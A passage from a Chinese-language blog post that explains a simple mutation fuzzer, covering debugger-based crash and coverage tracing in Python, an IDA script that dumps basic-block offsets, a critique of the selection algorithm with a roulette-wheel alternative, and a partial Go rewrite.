/usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7fbd000     0x7ffff7fc3000 rw-p     6000      0 [anon_7ffff7fbd]</span><br><span class="line">    0x7ffff7fcb000     0x7ffff7fce000 r--p     3000      0 [vvar]</span><br><span class="line">    0x7ffff7fce000     0x7ffff7fcf000 r-xp     1000      0 [vdso]</span><br><span class="line">    0x7ffff7fcf000     0x7ffff7fd0000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7fd0000     0x7ffff7ff3000 r-xp    23000   1000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ff3000     0x7ffff7ffb000 r--p     8000  24000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  2c000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  2d000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]</span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]</span><br></pre></td></tr></table></figure>

<h3 id="获取断点的函数"><a href="#获取断点的函数" class="headerlink" title="获取断点的函数"></a>获取断点的函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_bpmap</span>(<span class="params">path</span>):</span><br><span class="line">    bpmap = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> path <span class="keyword">and</span> os.path.isfile(path):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> fh:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> fh.readlines():  <span class="comment">## 按 16进制 保存  </span></span><br><span class="line">                bpmap.extend(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x.strip(), <span class="number">16</span>), line.split())))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No breakpoint map; trace won&#x27;t be generated&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpmap</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="整体-fuzz-逻辑"><a href="#整体-fuzz-逻辑" class="headerlink" title="整体 fuzz 逻辑"></a>整体 fuzz 逻辑</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">execute_fuzz</span>(<span class="params">dbg, data, bpmap</span>):</span><br><span class="line">    trace = <span class="built_in">set</span>()</span><br><span class="line">    cmd = [config[<span class="string">&quot;target&quot;</span>], config[<span class="string">&quot;file&quot;</span>]]</span><br><span class="line">    pid = debugger.child.createChild(cmd, no_stdout=<span class="literal">True</span>, env=<span class="literal">None</span>)</span><br><span class="line">    proc = dbg.addProcess(pid, <span class="literal">True</span>)</span><br><span class="line">    base = get_base(proc.readMappings())  <span class="comment"># 得基础地址  </span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Insert breakpoints for tracing</span></span><br><span class="line">    <span class="keyword">if</span> bpmap:</span><br><span class="line">        <span class="keyword">for</span> offset <span class="keyword">in</span> bpmap:</span><br><span class="line">            proc.createBreakpoint(base + offset)  <span class="comment"># 设置断点  </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        proc.cont()  <span class="comment"># 继续跑  </span></span><br><span class="line">        event = dbg.waitProcessEvent()</span><br><span class="line">        <span class="comment"># 等事件</span></span><br><span class="line">        <span class="keyword">if</span> event.signum == signal.SIGSEGV:</span><br><span class="line">            crash_ip = (</span><br><span class="line">                proc.getInstrPointer() - base - <span class="number">1</span></span><br><span class="line">            )  <span class="comment"># getInstrPointer() always returns instruction + 1</span></span><br><span class="line">            <span class="keyword">if</span> crash_ip <span class="keyword">not</span> <span class="keyword">in</span> crashes:  <span class="comment"># 唯一化保存垃圾  </span></span><br><span class="line">                crashes[crash_ip] = data</span><br><span class="line">            proc.detach()  <span class="comment"># 脱调试，直接 break 出去  </span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> event.signum == signal.SIGTRAP:  <span class="comment"># 断点  </span></span><br><span class="line">            ip = proc.getInstrPointer()</span><br><span class="line">            br = proc.findBreakpoint(ip - <span class="number">1</span>).desinstall()  <span class="comment"># 命中就取消  </span></span><br><span class="line">            proc.setInstrPointer(ip - <span class="number">1</span>)  <span class="comment"># Rewind back to the correct code</span></span><br><span class="line">            trace.add(ip - base - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> event.signum == signal.SIGINT:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Stoping execution&quot;</span>)</span><br><span class="line">            proc.detach()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(event, debugger.ProcessExit):</span><br><span class="line">            proc.detach()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Something went wrong -&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(event))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Program terminated</span></span><br><span class="line">    <span class="keyword">return</span> trace</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>整体看下来，就是把要 fuzz 的和要打断点的一个个打上，然后一个永真，不断执行下去，最后出错了就保存造成 crash 的数据，不然就更新自己的 trace。最后返回的是 trace，也就是程序命中的断点数目</p>
<h3 id="main-函数执行逻辑"><a href="#main-函数执行逻辑" class="headerlink" title="main 函数执行逻辑"></a>main 函数执行逻辑</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> sample <span class="keyword">in</span> mutator:</span><br><span class="line">    save_file(sample)</span><br><span class="line">    trace = execute_fuzz(dbg, sample, bp_map)</span><br><span class="line">    mutator.update_corpus(sample, trace)</span><br><span class="line">    counter += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot;#&#123;:3d&#125; Coverage &#123;:.2f&#125;%\r&quot;</span>.<span class="built_in">format</span>(counter, (<span class="built_in">len</span>(trace) / <span class="built_in">len</span>(bp_map)) * <span class="number">100</span>),</span><br><span class="line">        end=<span class="string">&quot;&quot;</span>,</span><br><span class="line">    )</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>就是保存文件，执行 fuzz ，然后根据 trace 不断更新变异器的过程。</p>
<h3 id="ida-脚本插件"><a href="#ida-脚本插件" class="headerlink" title="ida 脚本插件"></a>ida 脚本插件</h3><p>师傅在这里用 binary ninja 写了个自动下断脚本，我把它改成 ida 脚本的形式，效果完全相同：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"></span><br><span class="line">skip_func = [</span><br><span class="line">    <span class="string">&quot;__libc_csu_init&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__libc_csu_fini&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_fini&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__do_global_dtors_aux&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_start&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_init&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sub_1034&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">min_ea = idaapi.cvar.inf.min_ea</span><br><span class="line">max_ea = idaapi.cvar.inf.max_ea</span><br><span class="line">bv = idaapi.get_bytes(idaapi.get_fileregion_offset(min_ea), max_ea - min_ea)</span><br><span class="line">base = idaapi.get_segm_by_name(<span class="string">&quot;.text&quot;</span>).start_ea</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> func_ea <span class="keyword">in</span> idautils.Functions(base, idaapi.get_segm_by_name(<span class="string">&quot;.text&quot;</span>).end_ea):</span><br><span class="line">    func_name = idaapi.get_func_name(func_ea)</span><br><span class="line">    <span class="keyword">if</span> func_name <span class="keyword">in</span> skip_func:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    func = idaapi.get_func(func_ea)</span><br><span class="line">    <span class="keyword">if</span> func_name <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> func.flags &amp; idaapi.FUNC_LIB:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    output = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> bb <span class="keyword">in</span> idaapi.FlowChart(idaapi.get_func(func_ea)):</span><br><span class="line">        output += <span class="string">&quot;0x&#123;:x&#125; &quot;</span>.<span class="built_in">format</span>(bb.start_ea - base)</span><br><span class="line">    <span class="built_in">print</span>(output)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在这里可以改成保存成文件的形式，方便之后加载到我们的断点中，这段代码的作用是遍历二进制文件中的所有函数，并输出每个函数的基本块地址。</p>
<p>首先，<code>min_ea</code> 和 <code>max_ea</code> 分别获取了当前二进制文件的起始地址和结束地址。然后，<code>idaapi.get_bytes()</code> 函数获取了整个二进制文件的字节流，并将其存储在 <code>bv</code> 变量中。接下来，<code>base</code> 获取了名为 <code>.text</code> 的段的起始地址，用于计算每个函数的基本块地址。<code>idautils.Functions()</code> 函数遍历了 <code>.text</code> 段中的所有函数，并将其存储在 <code>func_ea</code> 变量中。在循环中，首先使用 <code>idaapi.get_func_name()</code> 函数获取当前函数的名称，并检查是否在 <code>skip_func</code> 列表中。如果在列表中，则跳过当前函数。然后，使用 <code>idaapi.get_func()</code> 函数获取当前函数的 <code>func_t</code> 结构体，并检查是否为导入函数或无效函数。如果是，则跳过当前函数。最后，使用 <code>idaapi.FlowChart()</code> 函数获取当前函数的控制流程图，并遍历其中的所有基本块。对于每个基本块，计算其相对于 <code>.text</code> 段的偏移量，并将其添加到 <code>output</code> 变量中。最后，输出 <code>output</code> 变量，即当前函数的所有基本块地址。</p>
<p>改写的这个插件可以得到每个函数的基本块地址，以便进行后续的分析和调试。</p>
<h2 id="变异算法"><a href="#变异算法" class="headerlink" title="变异算法"></a>变异算法</h2><p>师傅在处理遗传算法的时候用的是这个算法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="variable language_">self</span>.corpus <span class="keyword">and</span> <span class="built_in">len</span>(<span class="variable language_">self</span>.pool) &lt; <span class="number">100</span>:</span><br><span class="line">    <span class="comment"># 如果执行过的样本集self.corpus非空，并且变异池self.pool的大小小于100，那么会进行补充  </span></span><br><span class="line">      <span class="variable language_">self</span>.corpus.sort(reverse = <span class="literal">True</span>, key = <span class="keyword">lambda</span> x: <span class="built_in">len</span>(x[<span class="number">1</span>]))</span><br><span class="line">      <span class="comment">#首先对执行过的样本集进行降序排序，按照观察到的块集合的长度进行比较  </span></span><br><span class="line">      <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">min</span>(<span class="number">100</span>-<span class="built_in">len</span>(<span class="variable language_">self</span>.pool), <span class="built_in">len</span>(<span class="variable language_">self</span>.corpus))):</span><br><span class="line">        <span class="comment"># Exponential Distribution</span></span><br><span class="line">        v = random.random() * random.random() * <span class="built_in">len</span>(<span class="variable language_">self</span>.corpus)</span><br><span class="line">        <span class="comment"># 通过该方式，随机选择一些样本并将其添加到变异池中，这里留个印象，这就是遗传算法的变异策略  </span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.pool.append(<span class="variable language_">self</span>.corpus[<span class="built_in">int</span>(v)])</span><br><span class="line">        <span class="variable language_">self</span>.corpus.pop(<span class="built_in">int</span>(v))</span><br><span class="line">        <span class="comment"># 添加后，从执行过的样本集中移除这些样本  </span></span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;Pool size: &#123;:d&#125; [backfill from corpus]&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(<span class="variable language_">self</span>.pool)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;### End of round\t\t&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>事实上，我们可以画个直方图看下具体分布情况：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">84</span>]: <span class="keyword">import</span> random</span><br><span class="line">    ...: <span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">    ...: data = [random.random() * random.random() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>)]</span><br><span class="line">    ...: plt.hist(data, bins=<span class="number">100</span>, density=<span class="literal">True</span>)</span><br><span class="line">    ...: plt.xlabel(<span class="string">&#x27;Value&#x27;</span>)</span><br><span class="line">    ...: plt.ylabel(<span class="string">&#x27;Occurrence probability&#x27;</span>)</span><br><span class="line">    ...: plt.title(<span class="string">&#x27;Distribution of random.random() * random.random()&#x27;</span>)</span><br><span class="line">    ...: plt.show()</span><br></pre></td></tr></table></figure>

<p>看上去似乎是合理的，因为索引越靠前的越容易被我们选中。但是试想一下：假如我们的 corpus 命中的 trace 是100、1、1、1、1、1、1、1。也就是说，索引为 0 的代表 100，其余所有都是一个很小的 trace：1，trace 为 1 所占比例甚至还大于我们的 100，这显然不是很合理。当然我说的很极端的情况，但也足够说明。因此我们需要真正把 trace 量化到具体遗传变异策略中，而不是通过一个索引的方式解决。我觉得对于该算法，使用轮盘赌是更合理的，类似这种：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">roulette_wheel_selection</span>(<span class="params">population, fitness</span>):</span><br><span class="line">    <span class="comment"># 计算适应度总和  </span></span><br><span class="line">    total_fitness = <span class="built_in">sum</span>(fitness)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算每个个体的选择概率  </span></span><br><span class="line">    probabilities = [fit / total_fitness <span class="keyword">for</span> fit <span class="keyword">in</span> fitness]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构建累积概率列表  </span></span><br><span class="line">    cumulative_probabilities = [</span><br><span class="line">        <span class="built_in">sum</span>(probabilities[: i + <span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(probabilities))</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 选择一个随机数  </span></span><br><span class="line">    random_num = random.random()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 根据随机数选择一个个体  </span></span><br><span class="line">    <span class="keyword">for</span> i, prob <span class="keyword">in</span> <span class="built_in">enumerate</span>(cumulative_probabilities):</span><br><span class="line">        <span class="keyword">if</span> random_num &lt;= prob:</span><br><span class="line">            <span class="keyword">return</span> population[i]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果未能选择，则返回最后一个个体  </span></span><br><span class="line">    <span class="keyword">return</span> population[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例用法  </span></span><br><span class="line">population = [<span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;E&quot;</span>]</span><br><span class="line">fitness = [<span class="number">100</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">selected_individual = roulette_wheel_selection(population, fitness)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Selected individual:&quot;</span>, selected_individual)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这种情况下更加合理，这样的话，我们 A，也就是命中更多断点的样例获得了更大的选择概率：100&#x2F;104。如果是之前的形式，我们优良的样例 A，选择概率甚至还没有命中 trace 为 1 的概率高：4&#x2F;5。</p>
<h2 id="go-重构思路"><a href="#go-重构思路" class="headerlink" title="go 重构思路"></a>go 重构思路</h2><p>我把师傅的 0.1 版本完成了 go 的重构，整体 fuzzer 的整体思路也基本敲明白了，之后没事了再开发，把代码敲到 GitHub 里</p>
<p>逐行看一下：需要创建造成 crashes 的文件夹，之后从命令行中得到需要 fuzz 的语料，之后使用 getBytes 得到原始文件，然后设置 fuzz 的整体轮数，将原始文件先拷贝到 data 中，之后产生一个变异。下一行，师傅把变异结果放到了一个新的文件中（createNew 函数），之后就是真正要执行的 executeFuzz。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> _, err := os.Stat(<span class="string">&quot;crashes&quot;</span>); os.IsNotExist(err) &#123;</span><br><span class="line">		<span class="keyword">if</span> err := os.Mkdir(<span class="string">&quot;crashes&quot;</span>, <span class="number">0755</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Printf(<span class="string">&quot;创建文件夹失败：%v\n&quot;</span>, err)</span><br><span class="line">			os.Exit(<span class="number">1</span>)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(os.Args) &lt; <span class="number">2</span> &#123;</span><br><span class="line">		usage()</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		filename := os.Args[<span class="number">2</span>]</span><br><span class="line">		<span class="comment">// fmt.Println(filename)</span></span><br><span class="line">		origData := getBytes(filename)</span><br><span class="line">		counter := <span class="number">0</span></span><br><span class="line">		<span class="keyword">for</span> counter &lt; <span class="number">100</span> &#123;<span class="comment">//代数，可以随便改，也可以不写死，按照参数的方式传进来</span></span><br><span class="line">			data := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(origData))</span><br><span class="line">			<span class="built_in">copy</span>(data, origData)</span><br><span class="line">			mutatedData := mutate(data)</span><br><span class="line">			createNew(mutatedData) <span class="comment">// 直接读内存的mutatedData也行</span></span><br><span class="line">			executeFuzz(mutatedData, counter)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> counter%<span class="number">10</span> == <span class="number">0</span> &#123;</span><br><span class="line">				fmt.Printf(<span class="string">&quot;Counter: %d\n&quot;</span>, counter)</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			counter++</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="executeFuzz"><a href="#executeFuzz" class="headerlink" title="executeFuzz"></a>executeFuzz</h3><p>executeFuzz函数严格意义上可以使用 <code>cmd.SysProcAttr = &amp;syscall.SysProcAttr{Ptrace: true}</code> 的父子进程调试的方式，但因为接收信号过于方便，就用了信号量的方式）。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">executeFuzz</span><span class="params">(data []<span class="type">byte</span>, counter <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">	cmd := exec.Command(<span class="string">&quot;./main&quot;</span>, <span class="string">&quot;data/mutated.jpg&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 启动子进程</span></span><br><span class="line">	<span class="keyword">if</span> err := cmd.Start(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;启动子进程失败：%v\n&quot;</span>, err)</span><br><span class="line">		os.Exit(<span class="number">1</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 等待子进程退出</span></span><br><span class="line">	done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">error</span>, <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		done &lt;- cmd.Wait()</span><br><span class="line">	&#125;()</span><br><span class="line">	<span class="keyword">if</span> err := &lt;-done; err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> err := writeDataToFile(counter, data); err != <span class="literal">nil</span> &#123;<span class="comment">//有错误的话，直接写一个 crash，程序继续进行</span></span><br><span class="line">				fmt.Printf(<span class="string">&quot;写入文件失败：%v\n&quot;</span>, err)</span><br><span class="line">				os.Exit(<span class="number">1</span>)</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			fmt.Println(<span class="string">&quot;写入文件成功！&quot;</span>)</span><br><span class="line">			fmt.Printf(<span class="string">&quot;子进程退出：%v\n&quot;</span>, err)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="mutate-函数"><a href="#mutate-函数" class="headerlink" title="mutate 函数"></a>mutate 函数</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> FLIP_RATIO = <span class="number">0.01</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> FLIP_ARRAY = []<span class="type">byte</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">32</span>, <span class="number">64</span>, <span class="number">128</span>&#125;<span class="comment">//进行异或</span></span><br><span class="line"><span class="keyword">var</span> MAGIC_VALS = [][]<span class="type">byte</span>&#123;<span class="comment">//期望能够输入最大值或最小值来让程序陷入边界条件判定</span></span><br><span class="line">	&#123;<span class="number">0xFF</span>&#125;,</span><br><span class="line">	&#123;<span class="number">0x7F</span>&#125;,</span><br><span class="line">	&#123;<span class="number">0x00</span>&#125;,</span><br><span class="line">	&#123;<span class="number">0xFF</span>, <span class="number">0xFF</span>&#125;,</span><br><span class="line">	&#123;<span class="number">0x00</span>, <span class="number">0x00</span>&#125;,</span><br><span class="line">	&#123;<span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>&#125;,</span><br><span class="line">	&#123;<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;,</span><br><span class="line">	&#123;<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x80</span>&#125;,</span><br><span class="line">	&#123;<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>&#125;,</span><br><span class="line">	&#123;<span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x7F</span>&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">mutate</span><span class="params">(data []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">    flips := <span class="type">int</span>(<span class="type">float64</span>(<span class="built_in">len</span>(data)<span class="number">-4</span>) * FLIP_RATIO)</span><br><span class="line">    flipIndexes := rand.Perm(<span class="built_in">len</span>(data) - <span class="number">8</span>)[:flips]<span class="comment">//这块想了半天，最后决定就这样吧。让底下加二也可以</span></span><br><span class="line">    <span class="comment">// fmt.Println(len(flipIndexes))</span></span><br><span 